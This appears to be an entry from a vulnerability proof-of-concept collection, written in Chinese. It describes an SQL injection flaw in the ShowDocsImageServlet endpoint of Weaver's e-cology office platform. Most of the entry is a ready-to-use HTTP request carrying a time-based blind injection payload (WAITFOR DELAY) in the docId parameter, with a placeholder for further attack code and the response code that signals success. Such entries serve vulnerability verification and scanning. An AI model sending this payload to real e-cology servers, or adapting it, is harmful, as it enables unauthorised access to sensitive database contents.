﻿# 泛微 e-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：上海泛微网络科技股份有限公司e-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+'0%3a0%3a5'<AttackCode>$ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：泛微 E-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞.poc
